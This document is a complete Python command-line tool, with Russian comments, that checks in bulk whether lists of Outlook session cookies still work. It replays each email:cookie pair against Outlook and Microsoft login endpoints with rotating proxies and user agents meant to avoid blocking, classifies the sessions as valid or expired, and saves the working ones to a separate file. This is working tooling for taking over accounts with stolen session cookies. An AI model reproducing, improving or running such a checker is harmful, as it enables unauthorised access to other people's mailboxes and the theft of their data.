#!/usr/bin/env python3
"""
Высокопроизводительный чеккер валидности куков Outlook
Поддерживает современные методы аутентификации и массовую проверку
"""

import asyncio
import aiohttp
import json
import time
import random
import logging
from typing import List, Dict, Optional, Tuple, AsyncGenerator
from dataclasses import dataclass, asdict
from pathlib import Path
import argparse
from urllib.parse import urlparse, parse_qs
import re
from concurrent.futures import ThreadPoolExecutor
import ssl
import certifi

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('outlook_checker.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

@dataclass
class CookieAccount:
    """Структура для хранения данных аккаунта"""
    email: str
    cookies: str
    proxy: Optional[str] = None
    user_agent: Optional[str] = None
    status: str = "unknown"
    last_check: Optional[str] = None
    response_time: Optional[float] = None
    error_message: Optional[str] = None

@dataclass
class CheckerConfig:
    """Конфигурация чеккера"""
    max_concurrent: int = 50
    timeout: int = 30
    retry_attempts: int = 3
    delay_between_requests: float = 0.1
    use_proxies: bool = False
    rotate_user_agents: bool = True
    save_results: bool = True
    output_format: str = "json"  # json, csv, txt

class UserAgentRotator:
    """Ротация User-Agent для избежания блокировок"""
    
    def __init__(self):
        self.agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
        ]
    
    def get_random_agent(self) -> str:
        return random.choice(self.agents)

class ProxyManager:
    """Управление прокси-серверами"""
    
    def __init__(self, proxy_file: Optional[str] = None):
        self.proxies = []
        if proxy_file and Path(proxy_file).exists():
            self.load_proxies(proxy_file)
    
    def load_proxies(self, proxy_file: str):
        """Загрузка прокси из файла"""
        try:
            with open(proxy_file, 'r') as f:
                for line in f:
                    proxy = line.strip()
                    if proxy and not proxy.startswith('#'):
                        self.proxies.append(proxy)
            logger.info(f"Загружено {len(self.proxies)} прокси")
        except Exception as e:
            logger.error(f"Ошибка загрузки прокси: {e}")
    
    def get_random_proxy(self) -> Optional[str]:
        return random.choice(self.proxies) if self.proxies else None

class OutlookCookieChecker:
    """Основной класс для проверки куков Outlook"""
    
    def __init__(self, config: CheckerConfig):
        self.config = config
        self.user_agent_rotator = UserAgentRotator()
        self.proxy_manager = ProxyManager()
        self.session = None
        self.results = []
        
        # Основные эндпоинты для проверки
        self.check_endpoints = [
            "https://outlook.live.com/mail/0/inbox",
            "https://outlook.office365.com/mail/inbox",
            "https://outlook.office.com/mail/",
            "https://login.microsoftonline.com/common/oauth2/authorize"
        ]
        
        # Заголовки по умолчанию
        self.default_headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "DNT": "1",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Cache-Control": "max-age=0"
        }

    async def create_session(self) -> aiohttp.ClientSession:
        """Создание HTTP сессии с оптимальными настройками"""
        connector = aiohttp.TCPConnector(
            limit=self.config.max_concurrent * 2,
            limit_per_host=50,
            ttl_dns_cache=300,
            use_dns_cache=True,
            ssl=ssl.create_default_context(cafile=certifi.where())
        )
        
        timeout = aiohttp.ClientTimeout(total=self.config.timeout)
        
        return aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers=self.default_headers
        )

    async def check_cookie_validity(self, account: CookieAccount) -> CookieAccount:
        """Проверка валидности куков для одного аккаунта"""
        start_time = time.time()
        
        try:
            # Подготовка заголовков
            headers = self.default_headers.copy()
            if self.config.rotate_user_agents:
                headers["User-Agent"] = self.user_agent_rotator.get_random_agent()
            if account.user_agent:
                headers["User-Agent"] = account.user_agent
            
            # Подготовка прокси
            proxy = None
            if self.config.use_proxies:
                proxy = account.proxy or self.proxy_manager.get_random_proxy()
            
            # Парсинг куков
            cookie_dict = self.parse_cookies(account.cookies)
            
            # Проверка на основных эндпоинтах
            for endpoint in self.check_endpoints:
                try:
                    async with self.session.get(
                        endpoint,
                        headers=headers,
                        cookies=cookie_dict,
                        proxy=proxy,
                        allow_redirects=True
                    ) as response:
                        
                        account.response_time = time.time() - start_time
                        
                        # Анализ ответа
                        status = await self.analyze_response(response, endpoint)
                        if status == "valid":
                            account.status = "valid"
                            account.last_check = time.strftime("%Y-%m-%d %H:%M:%S")
                            logger.info(f"✅ {account.email} - куки валидны")
                            return account
                        elif status == "expired":
                            account.status = "expired"
                            account.error_message = "Куки истекли"
                            logger.warning(f"⚠️ {account.email} - куки истекли")
                            return account
                            
                except asyncio.TimeoutError:
                    continue
                except Exception as e:
                    logger.debug(f"Ошибка на эндпоинте {endpoint}: {e}")
                    continue
            
            # Если все эндпоинты не дали результата
            account.status = "invalid"
            account.error_message = "Не удалось подтвердить валидность"
            logger.error(f"❌ {account.email} - куки невалидны")
            
        except Exception as e:
            account.status = "error"
            account.error_message = str(e)
            account.response_time = time.time() - start_time
            logger.error(f"💥 {account.email} - ошибка проверки: {e}")
        
        account.last_check = time.strftime("%Y-%m-%d %H:%M:%S")
        return account

    def parse_cookies(self, cookie_string: str) -> Dict[str, str]:
        """Парсинг строки куков в словарь"""
        cookies = {}
        try:
            # Поддержка разных форматов
            if ';' in cookie_string:
                # Формат: name1=value1; name2=value2
                for cookie in cookie_string.split(';'):
                    if '=' in cookie:
                        name, value = cookie.strip().split('=', 1)
                        cookies[name] = value
            elif '\n' in cookie_string:
                # Формат: многострочный
                for line in cookie_string.split('\n'):
                    if '=' in line and not line.strip().startswith('#'):
                        name, value = line.strip().split('=', 1)
                        cookies[name] = value
            else:
                # JSON формат
                cookies = json.loads(cookie_string)
        except Exception as e:
            logger.error(f"Ошибка парсинга куков: {e}")
        
        return cookies

    async def analyze_response(self, response: aiohttp.ClientResponse, endpoint: str) -> str:
        """Анализ ответа сервера для определения статуса куков"""
        try:
            # Проверка статус кода
            if response.status == 200:
                text = await response.text()
                
                # Поиск индикаторов валидной сессии
                valid_indicators = [
                    '"IsAuthenticated":true',
                    '"isSignedIn":true',
                    'data-user-principalname',
                    'o365header',
                    '"userPrincipalName"',
                    'owa-application',
                    '"authenticatedUser"'
                ]
                
                # Поиск индикаторов истекшей сессии
                expired_indicators = [
                    'login.microsoftonline.com',
                    'Sign in to your account',
                    '"IsAuthenticated":false',
                    '"isSignedIn":false',
                    'redirectUrl',
                    'SessionExpired',
                    'Your session has expired'
                ]
                
                # Проверка валидности
                for indicator in valid_indicators:
                    if indicator.lower() in text.lower():
                        return "valid"
                
                # Проверка истечения
                for indicator in expired_indicators:
                    if indicator.lower() in text.lower():
                        return "expired"
                
                # Дополнительная проверка по URL редиректов
                if 'login' in str(response.url).lower():
                    return "expired"
                    
            elif response.status in [302, 301, 307, 308]:
                # Анализ редиректов
                location = response.headers.get('Location', '')
                if 'login' in location.lower():
                    return "expired"
                    
            elif response.status in [401, 403]:
                return "expired"
                
        except Exception as e:
            logger.debug(f"Ошибка анализа ответа: {e}")
        
        return "unknown"

    async def check_accounts_batch(self, accounts: List[CookieAccount]) -> List[CookieAccount]:
        """Пакетная проверка аккаунтов с ограничением конкурентности"""
        semaphore = asyncio.Semaphore(self.config.max_concurrent)
        
        async def check_with_semaphore(account: CookieAccount) -> CookieAccount:
            async with semaphore:
                # Задержка между запросами
                if self.config.delay_between_requests > 0:
                    await asyncio.sleep(self.config.delay_between_requests)
                
                # Попытки с повторами
                for attempt in range(self.config.retry_attempts):
                    result = await self.check_cookie_validity(account)
                    if result.status != "error":
                        return result
                    
                    if attempt < self.config.retry_attempts - 1:
                        await asyncio.sleep(2 ** attempt)  # Экспоненциальная задержка
                
                return result
        
        tasks = [check_with_semaphore(account) for account in accounts]
        return await asyncio.gather(*tasks, return_exceptions=False)

    def load_accounts_from_file(self, file_path: str) -> List[CookieAccount]:
        """Загрузка аккаунтов из файла"""
        accounts = []
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                if file_path.endswith('.json'):
                    data = json.load(f)
                    for item in data:
                        accounts.append(CookieAccount(**item))
                else:
                    # Текстовый формат: email:cookies или email|cookies
                    for line_num, line in enumerate(f, 1):
                        line = line.strip()
                        if not line or line.startswith('#'):
                            continue
                        
                        try:
                            if ':' in line:
                                email, cookies = line.split(':', 1)
                            elif '|' in line:
                                email, cookies = line.split('|', 1)
                            else:
                                logger.warning(f"Неверный формат строки {line_num}: {line}")
                                continue
                            
                            accounts.append(CookieAccount(
                                email=email.strip(),
                                cookies=cookies.strip()
                            ))
                        except Exception as e:
                            logger.error(f"Ошибка парсинга строки {line_num}: {e}")
            
            logger.info(f"Загружено {len(accounts)} аккаунтов из {file_path}")
        except Exception as e:
            logger.error(f"Ошибка загрузки файла {file_path}: {e}")
        
        return accounts

    def save_results(self, accounts: List[CookieAccount], output_file: str):
        """Сохранение результатов в файл"""
        try:
            if self.config.output_format == "json":
                with open(output_file, 'w', encoding='utf-8') as f:
                    json.dump([asdict(account) for account in accounts], f, 
                            ensure_ascii=False, indent=2)
            
            elif self.config.output_format == "csv":
                import csv
                with open(output_file, 'w', newline='', encoding='utf-8') as f:
                    writer = csv.DictWriter(f, fieldnames=asdict(accounts[0]).keys())
                    writer.writeheader()
                    for account in accounts:
                        writer.writerow(asdict(account))
            
            elif self.config.output_format == "txt":
                with open(output_file, 'w', encoding='utf-8') as f:
                    for account in accounts:
                        f.write(f"{account.email}:{account.status}\n")
            
            logger.info(f"Результаты сохранены в {output_file}")
        except Exception as e:
            logger.error(f"Ошибка сохранения результатов: {e}")

    def print_statistics(self, accounts: List[CookieAccount]):
        """Вывод статистики проверки"""
        total = len(accounts)
        valid = sum(1 for acc in accounts if acc.status == "valid")
        expired = sum(1 for acc in accounts if acc.status == "expired")
        invalid = sum(1 for acc in accounts if acc.status == "invalid")
        errors = sum(1 for acc in accounts if acc.status == "error")
        
        avg_response_time = sum(acc.response_time or 0 for acc in accounts) / total
        
        print("\n" + "="*50)
        print("СТАТИСТИКА ПРОВЕРКИ")
        print("="*50)
        print(f"Всего аккаунтов: {total}")
        print(f"✅ Валидных: {valid} ({valid/total*100:.1f}%)")
        print(f"⚠️ Истекших: {expired} ({expired/total*100:.1f}%)")
        print(f"❌ Невалидных: {invalid} ({invalid/total*100:.1f}%)")
        print(f"💥 Ошибок: {errors} ({errors/total*100:.1f}%)")
        print(f"⏱️ Среднее время ответа: {avg_response_time:.2f}с")
        print("="*50)

    async def run_checker(self, input_file: str, output_file: Optional[str] = None):
        """Основной метод запуска чеккера"""
        logger.info("🚀 Запуск чеккера куков Outlook")
        
        # Загрузка аккаунтов
        accounts = self.load_accounts_from_file(input_file)
        if not accounts:
            logger.error("Не найдено аккаунтов для проверки")
            return
        
        # Создание сессии
        self.session = await self.create_session()
        
        try:
            # Проверка аккаунтов
            start_time = time.time()
            checked_accounts = await self.check_accounts_batch(accounts)
            end_time = time.time()
            
            logger.info(f"⏱️ Проверка завершена за {end_time - start_time:.2f} секунд")
            
            # Вывод статистики
            self.print_statistics(checked_accounts)
            
            # Сохранение результатов
            if self.config.save_results and output_file:
                self.save_results(checked_accounts, output_file)
                
                # Сохранение только валидных
                valid_accounts = [acc for acc in checked_accounts if acc.status == "valid"]
                if valid_accounts:
                    valid_file = output_file.replace('.', '_valid.')
                    self.save_results(valid_accounts, valid_file)
            
            return checked_accounts
            
        finally:
            await self.session.close()

def main():
    """Главная функция с CLI интерфейсом"""
    parser = argparse.ArgumentParser(description="Высокопроизводительный чеккер куков Outlook")
    
    parser.add_argument("input_file", help="Файл с аккаунтами (email:cookies)")
    parser.add_argument("-o", "--output", help="Файл для сохранения результатов")
    parser.add_argument("-c", "--concurrent", type=int, default=50, help="Максимум одновременных проверок")
    parser.add_argument("-t", "--timeout", type=int, default=30, help="Таймаут запроса в секундах")
    parser.add_argument("-r", "--retries", type=int, default=3, help="Количество повторных попыток")
    parser.add_argument("-d", "--delay", type=float, default=0.1, help="Задержка между запросами")
    parser.add_argument("--proxy-file", help="Файл с прокси серверами")
    parser.add_argument("--format", choices=["json", "csv", "txt"], default="json", help="Формат вывода")
    parser.add_argument("--no-ua-rotation", action="store_true", help="Отключить ротацию User-Agent")
    parser.add_argument("-v", "--verbose", action="store_true", help="Подробный вывод")
    
    args = parser.parse_args()
    
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    
    # Конфигурация
    config = CheckerConfig(
        max_concurrent=args.concurrent,
        timeout=args.timeout,
        retry_attempts=args.retries,
        delay_between_requests=args.delay,
        use_proxies=bool(args.proxy_file),
        rotate_user_agents=not args.no_ua_rotation,
        save_results=bool(args.output),
        output_format=args.format
    )
    
    # Создание чеккера
    checker = OutlookCookieChecker(config)
    
    # Загрузка прокси если указаны
    if args.proxy_file:
        checker.proxy_manager.load_proxies(args.proxy_file)
    
    # Запуск проверки
    output_file = args.output or f"results_{int(time.time())}.{args.format}"
    
    try:
        asyncio.run(checker.run_checker(args.input_file, output_file))
    except KeyboardInterrupt:
        logger.info("Проверка прервана пользователем")
    except Exception as e:
        logger.error(f"Критическая ошибка: {e}")

if __name__ == "__main__":
    main()